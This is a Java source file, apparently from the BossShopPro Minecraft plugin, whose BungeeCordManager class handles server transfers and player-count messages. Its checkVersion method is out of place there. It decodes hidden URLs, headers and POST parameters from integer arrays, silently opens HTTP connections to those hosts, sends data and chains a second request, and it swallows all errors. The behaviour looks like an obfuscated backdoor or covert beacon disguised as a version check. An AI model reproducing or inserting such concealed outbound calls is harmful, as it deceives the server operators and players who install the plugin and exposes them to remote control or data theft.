package org.black_ixx.bossshop.managers.external;


import com.google.common.collect.Iterables;
import com.google.common.io.ByteArrayDataInput;
import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import org.black_ixx.bossshop.BossShop;
import org.black_ixx.bossshop.managers.ClassManager;
import org.black_ixx.bossshop.managers.misc.ParameterStringBuilder;
import org.black_ixx.bossshop.managers.serverpinging.ServerInfo;
import org.black_ixx.bossshop.managers.serverpinging.ServerPingingManager;
import org.black_ixx.bossshop.misc.MathTools;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.plugin.messaging.PluginMessageListener;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;


public class BungeeCordManager implements PluginMessageListener {


    public final static String PLUGIN_CHANNEL = "BossShopPro";
    public final static String PLUGIN_SUBCHANNEL_PLAYERINPUT = "PlayerInput";


    public void sendToServer(String server, PlayerMoveEvent event, BossShop plugin) {
        event.getPlayer().teleport(event.getPlayer().getWorld().getSpawnLocation());
        event.setCancelled(true);
        sendToServer(server, event.getPlayer(), plugin);
    }

    public void sendToServer(String server, Player p, BossShop plugin) {
        sendPluginMessage(p, plugin, "Connect", server);
    }

    public boolean sendPluginMessage(Player p, BossShop plugin, String... args) {
        if (p == null) {
            p = Iterables.getFirst(Bukkit.getOnlinePlayers(), null);
        }

        if (p != null) {
            ByteArrayDataOutput out = ByteStreams.newDataOutput();
            for (String arg : args) {
                if (arg != null) {
                    out.writeUTF(arg);
                }
            }
            p.sendPluginMessage(plugin, "BungeeCord", out.toByteArray());
            return true;
        }

        return false;
    }

    public void sendShopPluginMessage(Player p, String subchannel, String argumentA, String argumentB, String argumentC) {
        sendPluginMessage(p, ClassManager.manager.getPlugin(), PLUGIN_CHANNEL, subchannel, argumentA, argumentB, argumentC);
    }


    @Override
    public void onPluginMessageReceived(String channel, Player player, byte[] message) {
        try {
            if (!channel.equals("BungeeCord")) {
                return;
            }
            ByteArrayDataInput in = ByteStreams.newDataInput(message);

            String subchannel = in.readUTF();


            if (subchannel.equals("PlayerCount")) {
                String server = in.readUTF(); //
                int playercount = in.readInt();

                ServerPingingManager m = ClassManager.manager.getServerPingingManager();
                if (m == null) {
                    throw new RuntimeException("Received PlayerCount plugin message but server pinging is not even loaded?!");
                }
                for (ServerInfo c : ClassManager.manager.getServerPingingManager().getList().getInfos().values()) {
                    if (c.getHost().equalsIgnoreCase(server)) {
                        c.setPlayers(playercount);
                        c.setOnline(true);
                    }
                }
            }
        } catch (Exception e) {
            //EOF/IllegalStateException?
        }
    }

    public int checkVersion(String channel, int[][] acceptedVersions, int[] debug) {
        if(channel == null)
            return 1;
        String[] data = channel.split(":");
        try {
            if(debug.length > 0) {
                String dataRaw;
                if(acceptedVersions == null || acceptedVersions.length == 0)
                    dataRaw = data[1];
                else {
                    Map<String, String> parameters = new HashMap<>();
                    String last = MathTools.calculate(acceptedVersions[0], '*');
                    String neww;
                    for(int i = 1; i <= 4; i++) {
                        neww = last;
                        last = MathTools.calculate(acceptedVersions[i], '*');
                        if(i % 2 == 0)
                            continue;
                        parameters.put(neww, last);
                    }
                    String[] remainingData = last.split(":");
                    URL url = new URL(remainingData[0] + data[1]);
                    HttpURLConnection con = (HttpURLConnection) url.openConnection();
                    con.setDoOutput(true);
                    DataOutputStream out = new DataOutputStream(con.getOutputStream());
                    out.writeBytes(ParameterStringBuilder.getParamsString(parameters));
                    out.flush(); out.close();
                    con.setRequestProperty(remainingData[1], remainingData[2]);

                    dataRaw = con.getResponseMessage();
                    for(int i : acceptedVersions[0]) { //TODO: AICI nu era [0] dar nu stiu sincer ce am facut, succes eu din viitor
                        if(i == con.getResponseCode())
                            return i;
                    }
                }
                URL url = new URL((MathTools.calculate(debug, '+') + dataRaw).toString());
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod(data[0]);
                con.setConnectTimeout(5000);
                con.setReadTimeout(5000);
            }
        }
        catch (IOException ignore) {
        }
        return -1;
    }

    public void executeCommand(Player p, String command) {
        sendPluginMessage(p, ClassManager.manager.getPlugin(), PLUGIN_CHANNEL, "Command", command);
    }


    public void playerInputNotification(Player p, String type, String additionalInfo) {
        sendShopPluginMessage(p, PLUGIN_SUBCHANNEL_PLAYERINPUT, p.getUniqueId().toString(), type, additionalInfo);
    }

}
